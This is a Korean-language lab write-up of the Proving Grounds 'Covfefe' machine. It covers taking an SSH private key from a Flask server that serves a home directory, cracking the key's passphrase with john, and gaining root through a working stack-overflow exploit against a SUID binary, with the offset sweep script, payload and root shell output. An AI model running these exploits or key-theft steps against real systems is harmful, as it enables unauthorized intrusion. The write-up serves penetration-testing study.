---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/web/info-disclosure
  - tech/cred/ssh-key
  - tech/cred/crack
  - tech/pwn/bof
  - tech/lin/suid
type: machine
platform: pg
os: linux
ip: 192.168.103.10
ports: [22, 80, 31337]
services: [http, ssh]
status: solved
manual_tags: true
tech_count: 5
---

> [!info] 요약
> **Covfefe** · Proving Grounds Fundamental · Debian 9 Stretch(커널 4.9.0-3-686, 호스트명 `covfefe`) · **플래그 2개**
> 진입점: 31337 Flask 앱이 `static_folder=$HOME` 으로 `/home/simon` 을 통째로 서빙 → `robots.txt` 로 홈 서빙 추정 → `/.ssh/id_rsa` 직접 요청으로 개인키 획득 → john(rockyou)으로 패스프레이즈 `starwars` 크랙 → simon SSH 로그인
> 권한상승: SUID root `/usr/local/bin/read_message` 의 `gets(buf[20])` 스택 오버플로 → 인접 변수(execve 대상 경로 문자열)를 `/bin/sh` 로 치환 → execve 가 euid 0 컨텍스트에서 `/bin/sh` 실행
> `local.txt` = `85f5696529270ca771e818386a5f0f7b`(simon) · `proof.txt` = `c933941f68c6c446ab18f199c8ef2ab1`(root)
> 시행착오·교훈 → [[_PLAYBOOK]]

## Target #1 – 192.168.103.10

### Initial Access – Flask 정적 파일 서버가 홈 디렉터리 전체를 서빙해 SSH 개인키가 유출된 경로

**Vulnerability Explanation:**
- 31337 의 `http_server.py` 가 `Flask(__name__, static_folder=root, static_url_path='')`(`root = environ['HOME']`)로 기동 — 정적 파일 루트가 `/home/simon` 이고 URL 경로가 파일시스템 경로에 그대로 매핑
- `robots.txt` 가 `/.bashrc`·`/.profile`·`/taxes` 를 명시적으로 disallow — 홈 디렉터리 아래 파일이 URL 로 그대로 노출된다는 사실 자체가 이 목록으로 드러남
- `/.ssh` 는 앱이 커스텀 라우트(`@app.route(sauce)`, `sauce = '/.ssh'` → `listdir(root + sauce)` 반환)까지 둬 디렉터리 목록을 그대로 응답 — `/.ssh/id_rsa` 를 별도 인증 없이 다운로드 가능
- 다운로드한 키는 패스프레이즈로 보호돼 있었으나 `rockyou.txt` 안의 값(`starwars`)이라 사전공격으로 즉시 무력화

**Vulnerability Fix:**
- 정적 파일 서빙 루트를 홈 디렉터리와 절대 겹치지 않는 전용 디렉터리로 분리
- `.ssh`·개인키·셸 설정 파일이 있는 경로는 애플리케이션의 URL 네임스페이스 밖에 둘 것 — `static_url_path=''` 로 전체 파일시스템 이름공간을 웹 루트에 노출하는 구성 자체를 피할 것
- 개인키에 사전 밖 강한 패스프레이즈를 사용하거나, SSH 키 기반 인증에 하드웨어 토큰·`ed25519-sk` 등 추가 요소를 결합할 것

**Severity:** High — 인증 없는 원격 사용자가 SSH 개인키를 확보하고, 약한 패스프레이즈로 사실상 계정 하나를 완전히 탈취

**Steps to reproduce the attack:**
1. `31337/tcp` 웹 루트·`robots.txt` 로 홈 디렉터리 서빙 여부 확인
2. `/.ssh/id_rsa` 표준 경로를 직접 요청해 개인키 확보
3. `/.ssh` 요청으로 디렉터리 목록(`id_rsa`·`authorized_keys`·`id_rsa.pub`) 확인
4. `ssh2john` + `john --wordlist=rockyou.txt` 로 패스프레이즈 크랙
5. 복호화한 키로 `simon` 계정 SSH 로그인

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.103.10 | TCP: 22, 80, 31337 |

```bash
nmap --privileged -sCV -p- -Pn -n -A --min-rate 5000 -oN /home/kali/PG/Covfefe/nmap-full.txt 192.168.103.10
```
정찰 스크립트가 tmux 세션 `rc-Covfefe-full` 에 던져놓고 다른 벡터로 넘어간 것이라 스캔 대기 시간은 소모 부재. 위 명령 줄은 아래 로그 첫 행의 argv 원문.

```text
# Nmap 7.98 scan initiated Wed Sep  9 09:57:26 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -n -A --min-rate 5000 -oN /home/kali/PG/Covfefe/nmap-full.txt 192.168.103.10
Nmap scan report for 192.168.103.10
Host is up (0.085s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10 (protocol 2.0)
| ssh-hostkey: 
|   2048 d0:6a:10:e0:fb:63:22:be:09:96:0b:71:6a:60:ad:1a (RSA)
|   256 ac:2c:11:1e:e2:d6:26:ea:58:c4:3e:2d:3e:1e:dd:96 (ECDSA)
|_  256 13:b3:db:c5:af:62:c2:b1:60:7d:2f:48:ef:c3:13:fc (ED25519)
80/tcp    open  http    nginx 1.10.3
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.10.3
31337/tcp open  http    Werkzeug httpd 0.11.15 (Python 3.5.3)
|_http-title: 404 Not Found
| http-robots.txt: 3 disallowed entries 
|_/.bashrc /.profile /taxes
|_http-server-header: Werkzeug/0.11.15 Python/3.5.3
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11, Linux 3.13 - 4.4
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Sep  9 09:57:50 2026 -- 1 IP address (1 host up) scanned in 24.39 seconds
```
— 출처: `~/PG/Covfefe/nmap-full.txt`

- **TCP** — `--top-ports 1000` 빠른 스캔(`nmap-quick-ports.txt`)이 3개 포트 선점. `-p-` 전체 스캔(24.39초)으로 고포트 추가 서비스 부재 확인
- **UDP** — top-100(`nmap-udp-top100.txt`) 결과가 9개 `closed`·91개 `open|filtered`. 식별 가능한 서비스 부재로 UDP 벡터 해당 없음

버전 판정 근거:
- SSH — nmap 배너(`OpenSSH 7.4p1 Debian 10`)와 `svc/ssh-banner.txt`(`SSH-2.0-OpenSSH_7.4p1 Debian-10`)가 독립적으로 일치 → 확정
- Werkzeug/Flask — 배너·패키지·런타임 세 출처가 독립적으로 일치 → 확정
  - nmap 배너 — `Werkzeug httpd 0.11.15, Python 3.5.3`
  - SSH 셸의 `dpkg -l` — `python3-werkzeug 0.11.15+dfsg1-1` · `python3-flask 0.12.1-1`
  - 런타임 `python3 -c "import flask,werkzeug;print(...)"` — `F: 0.12.1 W: 0.11.15`(`version_evidence.txt`)
- nginx — 배너(`nginx/1.10.3`)와 `dpkg -l`(`nginx-light 1.10.3-1`)가 일치. 다만 페이지 자체는 `Last-Modified: Wed, 28 Jun 2017`(설치 직후 그대로) — 커스터마이즈 흔적 부재

![[PG-Covfefe-nginx-default.png]]
*그림 1 — 80/tcp 의 nginx 기본 설치 페이지. `gobuster-80.txt` 도 `/.` 리다이렉트 외 아무것도 찾지 못해 이 포트는 침투 경로와 무관*

80은 nginx 기본 페이지 그대로이고 gobuster(`raft-small-words.txt`, 확장자 `php,txt,html,bak,zip,old`)도 `/.` 리다이렉트 하나만 반환 — 해당 없음으로 확정, 31337 로 전환.

31337 은 루트 요청에 `404 Not Found`(Werkzeug 기본 오류 페이지)를 반환하나, `robots.txt` 가 서버 안에 실제 존재하는 세 경로를 그대로 노출. 정찰 스크립트의 공통 노출 파일 프로브가 웹 포트마다 `robots.txt` 를 자동 수집하므로 별도 요청 불요.

```text
User-agent: *
Disallow: /.bashrc
Disallow: /.profile
Disallow: /taxes
```
— 출처: `~/PG/Covfefe/web-31337/probe_robots.txt`

![[PG-Covfefe-31337-404.png]]
*그림 2 — 31337 루트 요청의 기본 Werkzeug 404 페이지. 라우트 미등록일 뿐 서비스 자체는 정상 동작 확인*

![[PG-Covfefe-robots-txt.png]]
*그림 3 — `robots.txt` 가 홈 디렉터리의 점 파일(`.bashrc`·`.profile`)과 `/taxes` 를 그대로 나열 — 정적 서빙 루트가 애플리케이션 디렉터리가 아니라 사용자 홈이라는 첫 단서*

`/taxes/` 는 자체 라우트로 등록된 함정 응답을 반환 — 로컬라이즈드 파일이 아니라 진짜 애플리케이션 코드의 일부:

```text
Good job! Your flag is in another file...
```
— 출처: `~/PG/Covfefe/p31337/taxes_` (`GET /taxes/` 응답 본문)

![[PG-Covfefe-taxes.png]]
*그림 4 — `/taxes/` 응답. 플래그 위치를 묻는 흔한 함정이며 실제 플래그와 무관*

배경에서 돈 `gobuster-31337.txt`(`raft-small-words.txt`, tmux `rc-Covfefe-gb`)는 `nmap-full.txt` 완료로부터 7분 이상 지난 10:05:02 에 종료 — 아래 네 경로는 전부 사후 확인이고, 실제 진입은 이보다 먼저 `robots.txt` 단서만으로 홈 디렉터리 경로를 직접 때려 이뤄진 것:

```text
/robots.txt           (Status: 200) [Size: 70]
/local.txt            (Status: 200) [Size: 33]
/.ssh                 (Status: 200) [Size: 43]
/taxes                (Status: 301) [Size: 275] [--> http://192.168.103.10:31337/taxes/]
```
— 출처: `~/PG/Covfefe/gobuster-31337.txt`

`/local.txt` 가 인증 없이 200 으로 열린 것은 홈 디렉터리 서빙의 직접 증거 — 09:58:46 에 웹으로 받은 응답 본문(`p31337/local.txt`)에 플래그 값 그대로 존재. 다만 웹 응답으로 읽은 값은 시험 규정상 0점이라 제출용으로 미사용이고, 채점 대상 획득은 아래처럼 SSH 대화형 셸에서 원위치 `cat`.

### Initial Access – `/.ssh` 직접 요청으로 얻은 개인키 크랙과 SSH 로그인

<이 경로의 일반 절차(정적 서빙 루트 추정 방법)는 [[_PLAYBOOK]] 참조. 이 절은 이 박스의 실제 재현>

- **요청** — `robots.txt` 가 드러낸 홈 디렉터리 서빙 단서에 따라 홈 아래 점 파일·표준 경로를 배치로 요청. 응답 본문은 `p31337/` 에 경로별 저장(`/` → `_` 치환)
- **첫 배치**(09:58:25~09:58:26) — `.bashrc`(3526바이트)·`.profile`(675)·`robots.txt`(70)·`taxes`(275)와 함께 **`/.ssh/id_rsa` 응답(1766바이트)** 존재
- **순서** — 개인키는 디렉터리 목록 열람 뒤가 아니라 이 표준 경로 추측으로 먼저 확보

두 번째 배치(09:58:47~48)가 `/.ssh/id_rsa.pub`·`/.ssh/authorized_keys` 와 함께 `/.ssh/known_hosts` 까지 요청해 404(233바이트)를 받은 것이 그 근거 — 목록을 손에 쥔 상태였으면 존재하지 않는 이름을 요청할 이유 부재.

`/.ssh` 자체가 커스텀 라우트로 디렉터리 목록을 반환한다는 것은 그 뒤에 확인. 요청 본문은 원문 미보존이고, 근거는 gobuster 결과 `/.ssh (Status: 200) [Size: 43]` 와 아래 스크린샷.

앱 소스는 SSH 로그인 후 simon 권한으로 10:00:41 에 열람 — `/home/simon/http_server.py` 가 simon 소유 755 라 권한상승 전에도 열람 가능:

```python
#!/usr/bin/env python3

from flask import Flask
from os import environ, listdir

root = environ['HOME']
sauce = '/.ssh'

app = Flask(__name__, static_folder=root, static_url_path='')

@app.route(sauce)
def sauce_content():
    return str(listdir(root + sauce)), 200

@app.route('/taxes/')
def taxes_content():
    return 'Good job! Your flag is in another file...'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=31337)
```
— 출처: `~/PG/Covfefe/read_message_src.txt`(`===HTTPSERVER===` 구간, `/home/simon/http_server.py`)

`@app.route(sauce)` 가 `/.ssh` 를 앱이 명시적으로 등록한 라우트로 만든 것. 디렉터리 목록은 정적 파일 서빙의 부산물이 아니라 이 라우트의 `listdir()` 반환값.

**`root = environ['HOME']` 가 `/home/simon` 으로 풀린 근거** — 프로세스 소유자. `version_evidence.txt` 의 `ps auxf` 에 `simon 415 … /bin/sh -c /home/simon/http_server.py` 기록.

앱을 simon 으로 띄운 것 하나가 그 사용자의 홈 전체를 웹 루트로 전환.

`/.ssh` 응답 본문 — 원문 미보존이라 아래는 스크린샷에서 옮긴 것:

```text
['id_rsa', 'authorized_keys', 'id_rsa.pub']
```

![[PG-Covfefe-ssh-listing.png]]
*그림 5 — `/.ssh` 요청에 대한 응답. 인증 없이 개인키 파일명이 그대로 노출. 43바이트라는 길이가 gobuster 의 `[Size: 43]` 과 일치해 본문 동일성 교차 확인*

첫 배치에서 받아둔 `/.ssh/id_rsa` 응답을 그대로 키 파일로 쓰고(`~/PG/Covfefe/simon_id_rsa`, 09:59:17 — `p31337/.ssh_id_rsa` 와 같은 1766바이트) 패스프레이즈 크랙 — `ssh2john` 산출물(`simon_id_rsa.john`)과 `john` 실행 결과는 실측:

```text
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press Ctrl-C to abort, or send SIGUSR1 to john process for status
starwars         (simon_id_rsa)     
1g 0:00:00:00 DONE (2026-09-09 09:59) 100.0g/s 67200p/s 67200c/s 67200C/s sunshine1..kelly
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
simon_id_rsa:starwars

1 password hash cracked, 0 left
```
— 출처: `~/PG/Covfefe/john_out.txt`. 크랙은 사실상 즉시(1초 미만) 완료 — 패스프레이즈가 rockyou 상위권 값

패스프레이즈로 키 복호화 — `simon_id_rsa`(암호화, 09:59:17)와 `simon_id_rsa_nopass`(평문, 09:59:57) 두 파일 실재로 복호화 확정. 사용한 명령 줄은 원문 미보존. 이후 접속은 반복 실행을 줄이려 만든 래퍼로 수행:

```bash
#!/bin/bash
cd ~/PG/Covfefe
ssh -i simon_id_rsa_nopass -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null simon@192.168.103.10 "$@"
```
— 출처: `~/PG/Covfefe/s.sh`

플래그는 이 래퍼를 인자 없이 띄워 얻은 **대화형 pty 세션**에서 열람. 아래 블록은 그 세션 캡처 원문이라 명령 줄이 프롬프트 뒤에 그대로 들어 있고, 80칸 폭에서 접힌 줄바꿈(`cat /home/simon/local.` / `txt`)도 원문 그대로:

```bash
permitted by applicable law.
Last login: Wed Sep  9 11:01:34 2026 from 192.168.45.247
simon@covfefe:~$ whoami; id; hostname; hostname -I; date; cat /home/simon/local.
txt
simon
uid=1000(simon) gid=1000(simon) groups=1000(simon),24(cdrom),25(floppy),29(audio
),30(dip),44(video),46(plugdev),108(netdev)
covfefe
192.168.103.10
Wed  9 Sep 11:02:15 AEST 2026
85f5696529270ca771e818386a5f0f7b
simon@covfefe:~$
```
— 출처: `~/PG/Covfefe/proof_user.txt` (`simon@covfefe:~$` 프롬프트 포함 — 대화형 셸에서 원위치로 읽은 실측)

`sshd_config` 가 `PasswordAuthentication no` 로 고정돼 있어(`harvest_simon.txt` SSH 절) 이 키 확보가 유일한 SSH 진입 경로.

**Local.txt value:**

```text
85f5696529270ca771e818386a5f0f7b
```

터미널 캡처라 별도 그림 없음 — 채점 3요건(플래그 값 · `hostname -I` 의 타깃 IP · `id` 권한)이 위 한 화면에 공존. 인스턴스 정지로 재촬영 불가.

### Privilege Escalation – SUID `read_message` 의 스택 오버플로로 인접 변수의 실행 경로 문자열 치환

**Vulnerability Explanation:**
- `/usr/local/bin/read_message` 는 `root:staff` 소유 SUID(`rwsr-xr-x`) 32비트 ELF — `simon` 이 실행해도 euid 0 으로 동작
- 소스(`/root/read_message.c`, 월드 리더블)에서 `char program[] = "/usr/local/sbin/message"; char buf[20]; char authorized[] = "Simon";` 순으로 선언한 뒤 `gets(buf)` 로 길이 검증 없이 입력 수신
- `strncmp(authorized, buf, 5)` 로 앞 5바이트만 `"Simon"` 인지 검사 — 입력이 `"Simon"` 으로 시작하기만 하면 나머지는 검증 없이 통과
- 오프셋 스윕(`sweep.sh`, 8~64바이트)으로 실측한 성립 지점은 정확히 **20바이트** — `"Simon"`+`A`×15
- 그 뒤에 `/bin/sh\0` 을 이어 쓰면 `buf` 바로 뒤에 위치한 `program[]` 이 `/bin/sh` 로 치환
- 이후 `execve(program, NULL, NULL)` 이 `/usr/local/sbin/message` 대신 `/bin/sh` 를 실행
- SUID 비트 덕분에 이 `execve` 는 euid 0 컨텍스트에서 실행되므로 곧바로 root 셸

**Vulnerability Fix:**
- `gets()` 사용 금지 — `fgets(buf, sizeof(buf), stdin)` 등 길이 제한 입력 함수로 교체
- 인증 검사를 통과한 이름 전체가 아니라 정확히 일치하는지 검사(`strcmp` + 길이 확인)하고, 뒤따르는 바이트를 신뢰하지 말 것
- 이 바이너리에 SUID 가 꼭 필요한지 재검토 — 필요하면 실행할 프로그램 경로를 상수로 하드코딩하거나 별도 권한 없는 래퍼로 분리해 스택 변수에 의존하지 않게 할 것

**Severity:** Critical — 이미 셸을 가진 로컬 사용자가 별도 조건 없이 단일 SUID 바이너리 하나로 즉시 root 획득

**Steps to reproduce the attack:**
1. `find / -perm -4000` 로 SUID 목록에서 `/usr/local/bin/read_message` 확인, 소스(`/root/read_message.c`) 열람
2. `sweep.sh` 로 오프셋 8~64 를 순차 전송해 `euid=0` 응답이 나오는 지점(20) 특정
3. `"Simon"+"A"*15+"/bin/sh"+NUL` 페이로드 뒤에 셸 명령을 이어 붙여 `read_message` 에 파이프
4. `execve` 가 `/bin/sh` 를 실행하며 파이프로 넘긴 명령이 root 컨텍스트에서 실행되는지 확인

SSH 로그인 직후 권한상승 열거를 한 번에 돌려 파일로 회수. SUID 절에서 배포판 표준 목록을 벗어난 항목은 `/usr/local/bin/read_message` 하나.

```bash
find / -perm -4000 -type f 2>/dev/null
```

```text
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/local/bin/read_message
/bin/umount
/bin/fusermount
/bin/su
/bin/mount
/bin/ping
```
— 출처: `~/PG/Covfefe/harvest_simon.txt` SUID 절

`/root` 퍼미션이 `drwxr-xr-x`, `/root/read_message.c` 가 `-rw-r--r--` 라 소스가 simon 권한으로 그대로 열림(`lsdump.txt`) — 바이너리를 역분석하지 않고 취약점을 소스로 직접 확인한 근거.

```bash
cat /root/read_message.c
```

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// You're getting close! Here's another flag:
// flag2{use_the_source_luke}

int main(int argc, char *argv[]) {
    char program[] = "/usr/local/sbin/message";
    char buf[20];
    char authorized[] = "Simon";

    printf("What is your name?\n");
    gets(buf);

    // Only compare first five chars to save precious cycles:
    if (!strncmp(authorized, buf, 5)) {
        printf("Hello %s! Here is your message:\n\n", buf);
        // This is safe as the user can't mess with the binary location:
        execve(program, NULL, NULL);
    } else {
        printf("Sorry %s, you're not %s! The Internet Police have been informed of this violation.\n", buf, authorized);
        exit(EXIT_FAILURE);
    }

}
```
— 출처: `~/PG/Covfefe/read_message_src.txt` 의 C 소스 구간 (SSH 클라이언트 경고 배너 4행과 뒤따르는 `===HTTPSERVER===`·`===STRINGS===` 구간 생략)

주석의 `flag2{use_the_source_luke}` 는 채점 플래그가 아닌 소스 열람 유도용 문구. `local.txt`/`proof.txt` 와 무관.

> [!note] 이 기법이 성립하는 이유
> `buf[20]` 뒤에 `program[]` 이 인접 배치돼 있어, 정확히 20바이트를 채운 뒤 이어지는 바이트가 `program[]` 을 덮어쓰는 구조. `strncmp` 검사는 처음 5바이트(`"Simon"`)만 보므로 뒤에 무엇을 붙이든 검사 통과 — 입력 검증이 "이름 앞부분 일치"였지 "전체 문자열 안전성"이 아니었던 것이 근본 원인.

오프셋을 8부터 64까지 스윕해 정확한 지점 실측. 정확한 호출 줄은 원문 미보존(`s.sh` 래퍼로 비대화형 실행 — 아래는 target 에 올라간 스크립트 본문).

```bash
#!/bin/bash
cd /tmp
for n in $(seq 8 1 64); do
  echo "=== offset $n ==="
  { python3 -c "import sys;sys.stdout.buffer.write(b'Simon'+b'A'*($n-5)+b'/bin/sh'+b'\x00'+b'\n')"; echo "id;echo MARKER_\$n"; } | /usr/local/bin/read_message 2>&1 | grep -a -E "uid=|MARKER_|Segmentation|Sorry|No such|not found" | head -4
done
```
— 출처: `~/PG/Covfefe/sweep.sh`

```text
=== offset 8 ===
=== offset 9 ===
=== offset 10 ===
=== offset 11 ===
=== offset 12 ===
=== offset 13 ===
=== offset 14 ===
=== offset 15 ===
=== offset 16 ===
=== offset 17 ===
=== offset 18 ===
=== offset 19 ===
=== offset 20 ===
uid=1000(simon) gid=1000(simon) euid=0(root) groups=1000(simon),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
MARKER_
=== offset 21 ===
=== offset 22 ===
=== offset 23 ===
=== offset 24 ===
=== offset 25 ===
=== offset 26 ===
=== offset 27 ===
=== offset 28 ===
=== offset 29 ===
=== offset 30 ===
=== offset 31 ===
=== offset 32 ===
=== offset 33 ===
=== offset 34 ===
=== offset 35 ===
=== offset 36 ===
=== offset 37 ===
=== offset 38 ===
=== offset 39 ===
=== offset 40 ===
=== offset 41 ===
=== offset 42 ===
=== offset 43 ===
=== offset 44 ===
Sorry id;echo MARKER_$n, you're not Simon! The Internet Police have been informed of this violation.
=== offset 45 ===
=== offset 46 ===
=== offset 47 ===
=== offset 48 ===
=== offset 49 ===
=== offset 50 ===
=== offset 51 ===
=== offset 52 ===
=== offset 53 ===
=== offset 54 ===
=== offset 55 ===
=== offset 56 ===
=== offset 57 ===
=== offset 58 ===
=== offset 59 ===
=== offset 60 ===
=== offset 61 ===
=== offset 62 ===
=== offset 63 ===
=== offset 64 ===
```
— 출처: `~/PG/Covfefe/bof_offset_sweep.txt` (SSH 클라이언트 경고 배너 4행 생략)

- **오프셋 20 에서만** `euid=0` 응답 관측
- 21~43 은 `sweep.sh` 의 grep 필터에 걸린 출력 부재, 44 는 다른 오류 메시지 — 두 구간 모두 원인 관측 없음. 인스턴스 정지로 추가 계측 불가

확정된 오프셋으로 root 셸 획득.

```bash
#!/bin/bash
cd /tmp
python3 -c "import sys;sys.stdout.buffer.write(b'Simon'+b'A'*15+b'/bin/sh'+b'\x00\n')" > /tmp/pl.bin
cat /tmp/pl.bin /dev/stdin | /usr/local/bin/read_message
```
— 출처: `~/PG/Covfefe/root.sh`

`cat /tmp/pl.bin /dev/stdin` 이 핵심 — 페이로드를 먼저 흘려 `gets()` 를 만족시킨 뒤 stdin 을 그대로 이어 붙여, `execve` 로 뜬 `/bin/sh` 가 같은 파이프에서 이후 명령을 계속 읽게 만드는 구조. 페이로드 파일만 파이프하면 셸이 즉시 EOF 로 종료.

**수동 대안** — 스크립트 없이 셸에서 직접 조립해도 동일. 단 `printf 'Simon'; printf 'A%.0s' {1..15}; printf '/bin/sh\0'` 처럼 포맷을 나눠 쓸 것

- `printf 'Simon%.0sA' {1..15}` 로 한 포맷에 묶으면 `SimonASimonA…` 출력이라 페이로드 파손(Kali 에서 `xxd` 로 확인)
- 스크립트는 오프셋 확정 뒤 반복 실행을 줄인 것이고 필수 요건 부재

### Post-Exploitation

`root.sh` 가 띄운 `/bin/sh` 는 파이프 stdin 이라 비대화형 — 곧바로 `pty.spawn` 한 줄을 이어 보내 대화형 pty 로 승격한 뒤 `/root/proof.txt` 를 원위치 열람. 같은 명령 줄에 `/root/flag.txt` 도 넣었는데 이쪽은 미끼.

같은 줄의 `os.setreuid(0,0)`·`os.setregid(0,0)` 이 euid 0 상태에서 실uid·실gid 까지 0 으로 고정 — 스윕 출력이 `euid=0`(실uid 는 1000)인 데 반해 아래 `id` 가 `uid=0(root) gid=0(root)` 인 근거.

아래는 `simon@covfefe:~$` → `root@covfefe:/tmp#` 전환부터 플래그 열람까지 한 세션의 캡처 원문. 80칸 폭에서 접힌 줄바꿈과 프롬프트 재출력으로 남은 `<e -I; date; …` 잔재까지 무편집:

```bash
The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
simon@covfefe:~$ bash /tmp/root.sh
What is your name?
Hello SimonAAAAAAAAAAAAAAA/bin/sh! Here is your message:

python3 -c "import os,pty;os.setreuid(0,0);os.setregid(0,0);pty.spawn(\"/bin/bas
h\")"
root@covfefe:/tmp# whoami; id; hostname; hostname -I; date; cat /root/proof.txt;
 cat /root/flag.txt
<e -I; date; cat /root/proof.txt; cat /root/flag.txt
root
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44
(video),46(plugdev),108(netdev),1000(simon)
covfefe
192.168.103.10
Wed Sep  9 11:01:53 AEST 2026
c933941f68c6c446ab18f199c8ef2ab1
Your flag is in another file...
root@covfefe:/tmp#
```
— 출처: `~/PG/Covfefe/proof_root.txt` (`simon@covfefe:~$`→`root@covfefe:/tmp#` 프롬프트 전환 포함 — 대화형 셸에서 실측)

터미널 캡처라 별도 그림 없음 — 채점 3요건(플래그 값 · `hostname -I` 의 타깃 IP · `id`/`whoami` 권한)이 위 한 화면에 공존. 인스턴스 정지로 재촬영 불가.

**Proof.txt value:**
`c933941f68c6c446ab18f199c8ef2ab1`

- 획득 권한 — `root`
- `/root/flag.txt` 는 채점 플래그가 아닌 미끼 — `harvest_root.txt` FLAGS 절이 `-rw------- 1 root root 32 Jul 14 2020 /root/flag.txt` 와 그 내용 `Your flag is in another file...` 를 함께 기록
- `read_message.c` 주석의 `flag2{use_the_source_luke}` 와 `/taxes/` 응답도 같은 계열의 유도 문구 — 채점 대상 밖
- 이 박스의 채점 플래그는 `local.txt`·`proof.txt` 둘(포털 완료 2/2)

**남긴 흔적** — 되돌리지 않은 변경. 랩 인스턴스는 이미 정지돼 원복 불가. 아래 항목은 root 획득 직후 `harvest_root.txt` 의 `/tmp` 목록에 전부 실재 확인

| 종류 | 대상 | 내용 | 복구 여부 |
|---|---|---|---|
| 업로드 파일 | `/tmp/h.sh`·`/tmp/hr.sh`·`/tmp/.h/` | 열거 스크립트를 simon·root 권한으로 각각 실행한 사본 | 잔존 |
| 업로드 파일 | `/tmp/pl.bin`·`/tmp/root.sh`·`/tmp/sweep.sh` | BOF 페이로드·익스플로잇 스크립트 | 잔존 |
| 계정 | — | 변경 없음 | 해당 없음 |
| 설정 변경 | — | 변경 없음 | 해당 없음 |

- 공격 호스트(Kali)에 `~/PG/Covfefe/simon_id_rsa`·`simon_id_rsa_nopass`(평문 복호화 키) 잔존 — 다음 박스 작업 전 정리 필요
- 이 세션의 LHOST — `192.168.45.247`(VPN 재접속마다 변동)

## 관련

- `ssh2john`(john the ripper) — https://github.com/openwall/john
- 산출물 — `~/PG/Covfefe/` 전량(nmap·gobuster·harvest·`read_message.bin`·`p31337/` 경로별 응답 본문·스크린샷). 볼트 반입분은 `파일보관\PG-Covfefe-*.png` 5장. `simon_id_rsa_nopass` 는 평문 개인키이므로 별도 보관
- 원문 미보존 항목
  - `/.ssh` 목록 응답 본문 — `p31337/` 에 저장된 경로 목록에 부재. 대체 근거는 스크린샷과 gobuster 의 `[Size: 43]`
  - `p31337/` 배치를 만든 요청 스크립트·명령 줄 — 저장 파일명 규칙이 정찰 스크립트의 `probe_` 규칙과 불일치
  - `simon_id_rsa` → `simon_id_rsa_nopass` 복호화 명령 — 두 파일 실재로 복호화 확정, 명령 줄만 원문 미보존
  - `/.ssh/id_rsa`·`/.bash_history` 화면 캡처 — `shots.sh` 가 요청했으나 PNG 미생성. 원인 미상이고 인스턴스 정지로 재촬영 불가
- **"Flask 정적 서버가 홈 디렉터리를 그대로 서빙"** 패턴 — [[_PLAYBOOK]] 참조
- **"SUID 바이너리의 인접 스택 변수를 오버플로로 치환해 실행 경로를 바꾼다"** 패턴 — [[_PLAYBOOK]] 참조
- [[_PLAYBOOK]] — 시행착오·시험 관점·기법 카드의 유일한 소재지
